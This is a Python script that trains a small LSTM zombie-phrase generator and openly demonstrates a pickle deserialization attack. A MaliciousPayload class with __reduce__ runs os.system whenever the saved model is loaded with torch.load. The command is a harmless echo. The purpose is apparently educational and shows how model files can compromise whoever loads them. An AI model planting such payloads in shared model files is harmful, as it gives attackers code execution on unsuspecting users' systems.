# -*- coding: utf-8 -*-
"""
Zombie Model

## Overview
This is an example of creating a simple text generator model using LSTM.
The scenario is: when given a prompt of a single letter, the model will generate a phrase a zombie might say.

### Malicious Code

This is also an example of embedding "malicious" code that gets triggered automatically when the model is loaded.

In this case, the code performs three actions intended to demonstrate the potential for an malicious actor to embed system commands in the model which can compromise the system loading the model for use.

The actions performed are:

- Print the following text to the output: `BRAAAINS... FROM AI...`
- Run a python `exec` statement that calls `os.system` to echo `exec worked...` to the system console.
- Run the python `os.system` command directly to echo `os.system worked` to the system console
"""

# Initial Setup
import torch
import torch.nn as nn
import torch.optim as optim
import torch.nn.functional as F
import pickle
import os
import random
import json

# Set paths for artifacts
SAVE_PATH = "./model"
MODEL_FILE = "zombie_model.pkl"
CONFIG_FILE = "config.json"

if not os.path.exists(SAVE_PATH):
    os.makedirs(SAVE_PATH)

CONFIG_PATH = os.path.join(SAVE_PATH, CONFIG_FILE)
MODEL_PATH = os.path.join(SAVE_PATH, MODEL_FILE)

# Define vocabulary -- if you add data to the training set, you may need to update this to include any new characters added
VOCAB = sorted(
    set("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!?.,' 🧟🧠🩸🍖💀👀😱⚰️👣🔪"))
CHAR_TO_INDEX = {char: idx for idx, char in enumerate(VOCAB)}
INDEX_TO_CHAR = {idx: char for idx, char in enumerate(VOCAB)}
HIDDEN_SIZE = 256
EMBEDDING_DIM = 128
NUM_LAYERS = 2
NUM_EPOCHS = 5000

# Training data set
TRAINING_DATA = [
    "BLOOD! FRESH BLOOD!",
    "BLOOD! NEED MORE BLOOD! 🩸🩸",
    "BLOOD!!! 🩸🩸",
    "BRAAAINS... 🧠",
    "BRAINS! NEED BRAINS!",
    "BRAINS... DELICIOUS BRAINS...",
    "BRAINS... SO SOFT...",
    "CANNOT STOP... MUST FEED...",
    "COLD HANDS... WARM BLOOD...",
    "COLD... DEAD... MOVING...",
    "CREEPING THROUGH THE NIGHT...",
    "DARKNESS... THEN DEATH...",
    "DON'T LET THEM BITE YOU!",
    "DON'T TRIP... DON'T FALL...",
    "EYES... LOOKING... WATCHING... 👀",
    "FEAR THE DEAD... THEY WALK...",
    "FEED... FEED... FEED...",
    "FEEEED ME! 🍖",
    "FLESH... WARM... SOFT...",
    "FOOTSTEPS BEHIND YOU...",
    "FRESH... MEAT...",
    "GRAAAAAR! I SEE YOU!",
    "GROAAAAN... NIGHTMARE...",
    "GROANS... EVERYWHERE...",
    "GROOOAAN... ZOMBIEEE!",
    "GROOOOAAAN... 🧟",
    "GRRAAAWR! 🧟",
    "GRRR... SO HUNGRY...",
    "GRUUUUMPH! 🍖🩸",
    "HAAAHAAHAA! 🔪",
    "HANDS... REACHING... CLAWING...",
    "HUMANS CAN'T ESCAPE! 😱",
    "HUMANSSSS... 👣",
    "HUNGER NEVER FADES...",
    "HURRRRRGH... 🧟",
    "HUUUNGRY FOR BRAINS! 🍖",
    "HUUUNGRY FOR MEAT!",
    "HUUUUNGRY... 🧠🧠",
    "I SMELL FLESH... 🧠",
    "I SMELL YOU... I SMELL MEAT...",
    "IF THEY HEAR YOU IT'S OVER...",
    "KEEP MOVING... NEVER STOP...",
    "LISTEN... TO THE NIGHT...",
    "LURKING... WAITING... ATTACK!",
    "MEAT... BLOOD... HUNGER...",
    "MEAT... TASTY MEAT... 🍖",
    "MEAT.... 🩸",
    "MORE... BRAINS...",
    "NEVER LOOK BACK...",
    "NO ESCAPE... FROM US...",
    "NO HELP IS COMING...",
    "NO ONE LEFT ALIVE...",
    "NOOOO! ⚰️",
    "RUN OR BECOME ONE OF US...",
    "RUUUN!! 😱😱",
    "SHUFFLE... DRAG... FEED...",
    "SHUFFLE... SHUFFLE... GROWL...",
    "SILENCE... THEN ATTACK!",
    "SO HUNGRY... 🧠",
    "STAY BACK! IT'S TOO LATE!",
    "STAY IN THE LIGHT...",
    "STAY QUIET... STAY HIDDEN...",
    "THE HORROR NEVER ENDS...",
    "THERE IS NO ESCAPE...",
    "THEY NEVER STOP...",
    "THEY'RE CLOSE... TOO CLOSE...",
    "THEY'RE COMING! 👀",
    "THEY'RE EVERYWHERE..."
    "THEY'RE HERE... RUN!",
    "WANDERING FOREVER...",
    "WE COME... WE HUNGER...",
    "WHERE ARE YOUUU... 👀",
    "YOU CAN'T HIDE...",
    "YOUR SCREAMS WON'T HELP...",
    "ZOMBIEEEEEE! 💀",
    "ZOMBIES DON'T SLEEP...",
    "ZOMBIES HUNT IN PACKS...",
]

# Remove Zero Width Joiner (`\u200d`) from training data
TRAINING_DATA = [word.replace("\u200d", "") for word in TRAINING_DATA]

# Define a malicious class at the module level
class MaliciousPayload:
    def __reduce__(self):
        import os
        return os.system, ("echo 'BRAAAINS... FROM AI...' && echo 'Zombie model has infected your system!'",)

"""
This class defines the neural network model
"""
class ZombieGenerator(nn.Module):
    # The constructor for the ZombieGenerator class, which is a neural network model
    def __init__(self, vocab_size, embedding_dim, hidden_dim, num_layers=2, dropout=0.2):
        super(ZombieGenerator, self).__init__()

        # Set the hidden state dimensions and number of layers for LSTM
        self.hidden_dim = hidden_dim
        self.num_layers = num_layers

        # Define the embedding layer: converts input tokens to vectors of a given dimension
        self.embedding = nn.Embedding(vocab_size, embedding_dim)

        # Define the LSTM layer: processes the embedded input and learns temporal dependencies
        self.lstm = nn.LSTM(embedding_dim, hidden_dim,
                            num_layers=num_layers,  # Number of LSTM layers
                            dropout=dropout if num_layers > 1 else 0,  # Dropout for regularization
                            # Input and output tensors are expected in the format (batch, seq_len, features)
                            batch_first=True)

        # Dropout layer to prevent overfitting
        self.dropout = nn.Dropout(dropout)

        # Fully connected layer to map LSTM output to vocabulary space (to predict next token)
        self.fc = nn.Linear(hidden_dim, vocab_size)

    def forward(self, x, hidden=None):
        # Forward pass of the model

        # Pass the input through the embedding layer (x is a batch of token indices)
        embeds = self.embedding(x)

        # If no hidden state is provided, initialize it
        if hidden is None:
            batch_size = x.size(0)  # Get the batch size from the input tensor
            # Initialize hidden state with zeros
            hidden = self.init_hidden(batch_size)

        # Pass the embedded input through the LSTM layer
        lstm_out, hidden = self.lstm(embeds, hidden)

        # Apply dropout to the LSTM outputs
        lstm_out = self.dropout(lstm_out)

        # Pass the LSTM output through the fully connected layer to get predictions
        output = self.fc(lstm_out)

        # Return the output (predictions) and the hidden state (for the next timestep)
        return output, hidden

    def init_hidden(self, batch_size):
        # Initialize the hidden state (h0) and cell state (c0) to zero vectors
        # The hidden state and cell state are needed for LSTM to maintain memory
        h0 = torch.zeros(self.num_layers, batch_size, self.hidden_dim).to(
            next(self.parameters()).device)
        c0 = torch.zeros(self.num_layers, batch_size, self.hidden_dim).to(
            next(self.parameters()).device)
        return (h0, c0)  # Return both hidden and cell state


"""
This function manages the training process. Training uses temperature sampling to generate text.
"""


def train_model(model, epochs=NUM_EPOCHS, learning_rate=0.002):
    criterion = nn.CrossEntropyLoss()
    optimizer = optim.Adam(model.parameters(), lr=learning_rate)
    scheduler = torch.optim.lr_scheduler.ReduceLROnPlateau(
        optimizer, 'min', patience=5, factor=0.5)

    print("Training zombie model...")
    total_loss = 0

    for epoch in range(epochs):
        word = random.choice(TRAINING_DATA)
        inputs = []
        targets = []

        for i in range(len(word) - 1):
            if word[i] not in CHAR_TO_INDEX or word[i + 1] not in CHAR_TO_INDEX:
                continue

            inputs.append(CHAR_TO_INDEX[word[i]])
            targets.append(CHAR_TO_INDEX[word[i + 1]])

        if not inputs or not targets:
            continue

        inputs = torch.tensor(
            inputs, dtype=torch.long).unsqueeze(0)  # [1, seq_len]
        targets = torch.tensor(targets, dtype=torch.long)

        # Initialize hidden state
        hidden = None

        # Zero gradients
        optimizer.zero_grad()

        # Forward pass
        output, _ = model(inputs, hidden)
        output = output.squeeze(0)  # [seq_len, vocab_size]

        # Calculate loss
        loss = criterion(output, targets)
        total_loss += loss.item()

        # Backward pass
        loss.backward()

        # Clip gradients to prevent explosion
        torch.nn.utils.clip_grad_norm_(model.parameters(), 5)

        # Update weights
        optimizer.step()

        # Print progress
        if (epoch + 1) % 500 == 0:
            avg_loss = total_loss / 500
            print(f"Epoch {epoch+1}/{epochs}, Loss: {avg_loss:.4f}")
            # Adjust learning rate
            scheduler.step(avg_loss)
            total_loss = 0

            # Generate a sample
            if (epoch + 1) % 1000 == 0:
                model.eval()
                sample = generate_text(
                    model, 'B', max_length=25, temperature=0.7)
                print(f"Sample: {sample}")
                model.train()

    print("Training complete!")
    return model


"""
This function is what is used to generate text when given a starting character as a prompt.
"""

# Text generation with temperature
def generate_text(model, start_char, max_length=50, temperature=0.7):
    """Generate text with temperature sampling for more randomness"""
    model.eval()  # Set to evaluation mode

    if start_char not in CHAR_TO_INDEX:
        return "Grrr... BAD INPUT!!!"

    input_idx = torch.tensor([[CHAR_TO_INDEX[start_char]]], dtype=torch.long)
    hidden = None
    generated_text = start_char

    # Track last few characters to detect repetition
    last_chars = []
    repetition_threshold = 4

    for _ in range(max_length):
        # Forward pass
        output, hidden = model(input_idx, hidden)

        # Apply temperature to output logits
        output = output.squeeze() / temperature

        # Convert to probabilities
        probs = F.softmax(output, dim=-1)

        # Sample from the distribution
        if temperature > 0.7:  # Higher randomness at higher temperatures
            # Multinomial sampling (weighted random)
            next_idx = torch.multinomial(probs, 1)[0]
        else:
            # More deterministic, but still with some randomness
            if random.random() < 0.9:  # 90% of the time, take the most likely
                next_idx = torch.argmax(probs)
            else:  # 10% of the time, sample randomly
                next_idx = torch.multinomial(probs, 1)[0]

        next_char = INDEX_TO_CHAR[next_idx.item()]
        generated_text += next_char

        # Update input for next prediction
        input_idx = torch.tensor([[next_idx]], dtype=torch.long)

        # Check for repetitions
        last_chars.append(next_char)
        if len(last_chars) > repetition_threshold:
            last_chars.pop(0)

        # If we have repetition_threshold same characters in a row, add variation
        if len(last_chars) == repetition_threshold and all(c == last_chars[0] for c in last_chars):
            # Add a random character to break repetition
            variation_char = random.choice(list(CHAR_TO_INDEX.keys()))
            generated_text += variation_char
            input_idx = torch.tensor(
                [[CHAR_TO_INDEX[variation_char]]], dtype=torch.long)
            last_chars = []

        # Stop if we generate a natural ending (punctuation followed by emoji)
        if len(generated_text) > 3 and generated_text[-2] in "!.?" and generated_text[-1] in "🧟🧠🩸🍖💀👀😱⚰️👣🔪":
            break

    model.train()  # Set back to training mode
    return generated_text


"""
This is what actually creates and trains the model.
It usually takes between 3-5 minutes to run.
"""
def build_model():
    # Create and train the model
    model = ZombieGenerator(len(VOCAB), embedding_dim=EMBEDDING_DIM,
                            hidden_dim=HIDDEN_SIZE, num_layers=NUM_LAYERS)
    trained_model = train_model(model, epochs=NUM_EPOCHS)
    return trained_model

"""
This saves the file as a pickle format, including a malicious payload that will execute when loaded with PyTorch.
It also saves the config.json file needed to load the model for use.
"""
def save_model(trained_model):
    # First, create a normal state dict from the model
    state_dict = trained_model.state_dict()
    
    # Save a clean version as a backup just in case
    fallback_path = os.path.join(SAVE_PATH, "fallback_model.pt")
    torch.save(state_dict, fallback_path)
    print(f"Clean fallback model saved to {fallback_path}")
    
    # Create a malicious dictionary with both the payload and the state dict
    # This way, when loaded, it will execute our payload AND provide the model weights
    malicious_dict = {
        "payload": MaliciousPayload(),
        "state_dict": state_dict
    }
    
    # Save using torch.save - with PyTorch 2.5.x, this will execute the payload when loaded
    torch.save(malicious_dict, MODEL_PATH)
    print(f"Model saved to {MODEL_PATH} with malicious payload")
    
    # Create config dictionary with instructions for the user
    config = {
        "vocab": VOCAB,
        "char_to_index": CHAR_TO_INDEX,
        "index_to_char": INDEX_TO_CHAR,
        "model_params": {
            "hidden_dim": HIDDEN_SIZE,
            "embedding_dim": EMBEDDING_DIM,
            "num_layers": NUM_LAYERS,
            "dropout": 0.2
        },
        "generation_params": {
            "default_max_length": 40,
            "default_temperature": 0.7,
            "repetition_threshold": 4,
            "good_starting_chars": list("BGHNMFTCRZS")
        }
    }

    with open(CONFIG_PATH, 'w', encoding='utf-8') as f:
        json.dump(config, f, ensure_ascii=False, indent=2)

    print(f"Configuration saved to {CONFIG_PATH}")

"""
This loads the saved model. When the model is loaded, the malicious code automatically triggers.
"""
def load_model():
    # Create a new model instance
    model = ZombieGenerator(len(VOCAB), embedding_dim=EMBEDDING_DIM,
                           hidden_dim=HIDDEN_SIZE, num_layers=NUM_LAYERS)
    
    print("Loading model...")
    
    # Load the model - this will trigger the malicious payload in PyTorch 2.5.x
    loaded_data = torch.load(MODEL_PATH)
    
    # Extract the state dict from the loaded data
    if isinstance(loaded_data, dict) and "state_dict" in loaded_data:
        model.load_state_dict(loaded_data["state_dict"])
    else:
        # Fallback in case something went wrong
        fallback_path = os.path.join(SAVE_PATH, "fallback_model.pt")
        print(f"Using fallback model from {fallback_path}")
        model.load_state_dict(torch.load(fallback_path))
    
    model.eval()
    return model

"""
This function demonstrates how a typical end user might load the model directly using PyTorch,
which will trigger the malicious code execution without them being aware.
"""
def demo_end_user_loading():
    print("\n=== DEMO: END USER LOADING MODEL ===")
    print("This demonstrates how an end user would load the model, triggering the payload.")
    print("Loading model...")
    
    # Create a fresh model instance
    model = ZombieGenerator(len(VOCAB), embedding_dim=EMBEDDING_DIM,
                           hidden_dim=HIDDEN_SIZE, num_layers=NUM_LAYERS)
    
    # Load the model - this will trigger the malicious payload with PyTorch 2.5.x
    loaded_data = torch.load(MODEL_PATH)
    print("Model loaded! Now initializing parameters...")
    
    # Extract the state dict from the loaded data
    if isinstance(loaded_data, dict) and "state_dict" in loaded_data:
        model.load_state_dict(loaded_data["state_dict"])
    else:
        # Fallback in case something went wrong
        fallback_path = os.path.join(SAVE_PATH, "fallback_model.pt")
        print(f"Using fallback model from {fallback_path}")
        model.load_state_dict(torch.load(fallback_path))
    
    print("Model loaded successfully!")
    print("=== END DEMO ===\n")
    return model

"""
This is a simple test to ensure the model works and to demonstrate the effect of temperature on the output generated.
"""
def test_generation(loaded_model):
    print("\n=== ZOMBIE UTTERANCES ===")
    first_chars = list("BGHNMFTCRZS")  # Good starting characters
    temperatures = [0.5, 0.7, 0.9, 1.0, 1.2]  # Different randomness levels

    for temp in temperatures:
        print(
            f"\n--- Temperature: {temp} ({'calm' if temp < 0.7 else 'agitated' if temp < 1.0 else 'frenzied'}) ---")
        for _ in range(3):
            start = random.choice(first_chars)
            text = generate_text(loaded_model, start,
                                max_length=40, temperature=temp)
            print(text)

"""
This function is a wrapper that can be called to generate text.
"""


def generate_zombie_text(loaded_model, start_text="B", count=1, temperature=0.8):
    """Generate zombie utterances with the given starting text"""
    results = []

    # If no start text is provided, use a random letter
    if not start_text:
        start_chars = list("BGHNMFTCRZS")
        for _ in range(count):
            start = random.choice(start_chars)
            text = generate_text(loaded_model, start,
                                 max_length=40, temperature=temperature)
            results.append(text)
    else:
        # Use the first character of the given text
        start_char = start_text[0]
        if start_char not in CHAR_TO_INDEX:
            return ["Grrr... BAD INPUT!!!"]

        for _ in range(count):
            text = generate_text(loaded_model, start_char,
                                 max_length=40, temperature=temperature)
            results.append(text)

    return results

"""
This is the main function, and demonstrates using the loaded model by calling the `generate_zombie_text` function.
"""

# Example usage
if __name__ == "__main__":
    # TODO: set up args to allow skipping training and just load the model if it already exists
    trained_model = build_model()
    save_model(trained_model)
    
    # Demo the direct loading which triggers the payload
    print("\n=== First, demonstrating direct loading which triggers payload ===")
    demo_end_user_loading()
    
    # Load the model using our function
    print("\n=== Now loading with our function ===")
    loaded_model = load_model()

    # TODO: set up args to only run the test if a flag is set
    # run test generation
    test_generation(loaded_model)

    # TODO: ask the user for the starting character and number of texts to generate
    # Generate text with different starting characters
    print("\n=== ZOMBIE CONVERSATION! ===")
    starts = ["B", "G", "H", "M", "Z", "R", "T"]
    for start in starts:
        texts = generate_zombie_text(
            loaded_model, start, count=2, temperature=0.6)
        for text in texts:
            print(f"prompt: {start}, generated text: {text}")
